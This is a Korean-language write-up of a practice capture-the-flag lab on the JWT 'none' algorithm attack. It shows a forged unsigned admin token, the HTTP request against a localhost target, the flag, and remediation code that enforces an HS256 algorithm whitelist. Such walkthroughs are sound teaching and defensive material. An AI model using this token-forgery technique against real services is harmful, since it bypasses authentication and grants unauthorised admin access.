+++
title = "VulnABLE CTF [LUXORA] Write-up: JWT Attacks 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "JWT", "Bronze", "Authentication", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: JWT Attacks 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Authentication Layer (JWT Attacks)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/jwt/bronze`
- **목표**: 발급받은 일반 사용자 권한의 JWT 토큰을 조작하여, 서명(Signature) 검증을 무력화하고 관리자(Admin) 권한을 탈취하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 토큰 획득 (Reconnaissance)

`/jwt/bronze` 경로에 접속하여 제공된 일반 테스트 계정(`guest` / `guest`)으로 로그인을 수행합니다. 로그인에 성공하면 서버는 클라이언트(브라우저)에게 인증의 증표로 **JWT (JSON Web Token)**를 발급해 줍니다.

브라우저의 **개발자 도구 (F12)** -> **Application 탭** -> **Cookies** (또는 Local Storage)를 확인하여 발급된 JWT 값을 복사합니다.

**[획득한 JWT 예시]**
```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6Imd1ZXN0In0.
H8d2qO_kF_q0eL... (서명 부분 생략)
```

이 토큰을 JWT 디코딩 도구(예: `jwt.io`)에 넣고 구조를 뜯어봅니다.

### 🔍 토큰 구조 분석
1. **Header (헤더)**: `{"alg":"HS256","typ":"JWT"}`
   - 서버가 이 토큰을 대칭키 알고리즘인 `HS256 (HMAC-SHA256)`으로 서명했음을 나타냅니다.
2. **Payload (페이로드)**: `{"username":"guest","role":"guest"}`
   - 현재 내 권한이 `guest`임을 나타냅니다.
3. **Signature (서명)**
   - 헤더와 페이로드가 변조되지 않았음을 보장하는 암호학적 해시값입니다.

**[해커의 사고 과정]**
1. 나의 궁극적인 목표는 Payload의 `"role": "guest"`를 `"role": "admin"`으로 바꾸는 것이다.
2. 하지만 중간 데이터(Payload)를 바꾸면, 마지막의 Signature 값과 일치하지 않게 되어 서버가 에러를 뱉어낼 것이다.
3. Signature를 다시 계산하려면 서버의 '비밀키(Secret Key)'를 알아야 하는데 현재로선 알 방법이 없다.
4. 그렇다면 **서버가 아예 서명 검증을 하지 않도록** 헤더를 조작해 볼 수 있을까? 가장 널리 알려진 취약점인 **`none` 알고리즘 공격**을 시도해보자!

---

## 💥 2. 취약점 검증 및 페이로드 설계 (Exploitation Strategy)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ]
|-- Decodes JWT
|-- Modifies Payload (role: admin)
|-- Signs with 'None' alg / Cracked Secret --> [ Web Server ]
                                               |-- Trusts JWT
```


JWT 표준 스펙에는 디버깅 목적으로 서명을 사용하지 않겠다는 뜻의 **`none` 알고리즘**이 정의되어 있습니다. 보안 패치가 되지 않은 구형 JWT 라이브러리는 클라이언트가 헤더에 `"alg": "none"`을 보내면, **서명이 없는 것을 정상으로 간주하고 검증 로직을 통과시켜 버립니다.**

### 💡 토큰 조작 프로세스

1. **헤더 조작 및 인코딩**: 
   - 원본: `{"alg":"HS256","typ":"JWT"}`
   - 조작: `{"alg":"none","typ":"JWT"}`
   - Base64Url 인코딩: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`

2. **페이로드 조작 및 인코딩**:
   - 원본: `{"username":"guest","role":"guest"}`
   - 조작: `{"username":"admin","role":"admin"}`
   - Base64Url 인코딩: `eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0`

3. **서명(Signature) 제거**:
   - `none` 알고리즘이므로 서명은 비워둡니다.
   - **주의**: 토큰의 구조를 맞추기 위해 마지막 구분자인 점(`.`)은 반드시 남겨두어야 합니다.

---

## 🚀 3. 공격 수행 및 익스플로잇 (Exploitation)

조작된 3개의 파트를 이어 붙여 최종 악성 토큰을 만듭니다.

**[최종 악성 JWT]**
```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.
```
*(맨 끝에 점 `.` 이 하나 남아있음에 주의하세요.)*

Burp Suite의 Repeater나 브라우저의 확장 프로그램(Cookie Editor)을 이용하여 기존의 JWT를 방금 만든 악성 JWT로 교체한 뒤, 관리자 전용 페이지(`/jwt/bronze/admin`)로 접근을 시도합니다.

### 패킷 전송
```http
GET /jwt/bronze/admin HTTP/1.1
Host: localhost:3000
Cookie: token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.
```

### 🔍 서버의 응답
서버의 취약한 JWT 검증 로직은 헤더의 `none`을 보고 서명 확인을 건너뛰었습니다. 그리고 페이로드의 `"role": "admin"`을 철썩같이 믿고 관리자 페이지를 열어줍니다!

```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "success",
  "message": "Welcome Admin! Here is your access key.",
  "flag": "FLAG{JWT_🥉_NONE_ALG_C3D4E5}"
}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

클라이언트가 서버의 검증 알고리즘을 마음대로 선택할 수 있게 허용한 치명적인 로직 결함을 찔러서 인증을 무력화시켰습니다.

**🔥 획득한 플래그:**
`FLAG{JWT_🥉_NONE_ALG_C3D4E5}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
이 공격은 수년 전 수많은 글로벌 IT 기업(애플, 페이팔 등)의 인증을 뚫었던 전설적인 취약점입니다.

* **취약한 방어 코드 예시**
```javascript
// 클라이언트가 보낸 토큰에 명시된 알고리즘을 그대로 믿고 검증을 수행함
const decoded = jwt.verify(token, secretKey); 
```

* **안전한 패치 코드 (알고리즘 화이트리스트 적용)**
토큰을 검증할 때, **서버가 허용하는 유일한 알고리즘을 명시적으로 강제**해야 합니다.
```javascript
// HS256 알고리즘으로 서명된 토큰만 통과시키도록 엄격히 제한
const decoded = jwt.verify(token, secretKey, { algorithms: ['HS256'] });
```
또한, 현재 사용 중인 서버의 JWT 파싱 라이브러리(Node.js의 `jsonwebtoken` 등)를 최신 버전으로 업데이트하면, 기본적으로 `none` 알고리즘을 거부하도록 자체 패치가 되어 있습니다.